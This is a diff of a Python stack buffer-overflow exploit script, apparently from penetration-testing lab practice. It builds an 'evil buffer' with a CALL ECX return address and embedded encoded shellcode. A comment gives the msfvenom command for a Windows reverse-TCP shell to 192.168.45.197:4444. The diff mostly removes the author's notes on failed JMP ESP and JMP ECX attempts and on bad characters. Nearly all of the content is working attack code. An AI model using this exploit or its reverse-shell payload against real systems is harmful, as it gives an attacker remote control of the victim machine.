@@ -5,19 +5,9 @@ try:
   print("\nSending evil buffer...")
 
   #filler = b"A" * 2080
-    
-  # 1) JMP ESP DOESN'T WORK!  NOT ENOUGH SPACE FOR SHELLCODE AND CAN'T INCREASE BUFFER.  
-  # 2) ECX is being overwritten w/ A's at the time of the crash.  
-  # 3) Need to find the create_pattern offset that overwrites start of ecx at crash 
-  # 4) Looks like ECX has enough space for shellcode.  
-  # 5) JMP ECX DOESN'T WORK!  PREVIOUSLY FOUND IT IN A PROTECTED MODULE...
-  	# ...DID NOT CHECK CLOSELY ENOUGH... eip = b"\x75\x4a\xfd\x02" #JMP ECX 02fd4a75  
-  # 6) CALL ECX comes back with 2 possibilities, one of which has x00 in it.
 
   eip = b"\x11\x2e\x80\x14"   # CALL ECX 14802e11 
   tail = b"\x43" * 12
-  
-  #needed to view the very end of ECX to see the badchars with "db ecx L830" (which is hex for 2096)
   
   # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.197 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x3b\x45"
 
@@ -49,7 +39,6 @@ b"\x39\xf7\x55\x40\xe4\x92\xd7\x0d\x17\x49\x1b\x28\x94\x7b"
 b"\xe4\xcf\x84\x0e\xe1\x94\x02\xe3\x9b\x85\xe6\x03\x0f\xa5"
 b"\x22")
 
-  
   #badchars = 
   #	\x3b
   #	\x45
@@ -69,4 +58,3 @@ b"\x22")
  
 except:
   print("\nCould not connect!")
-
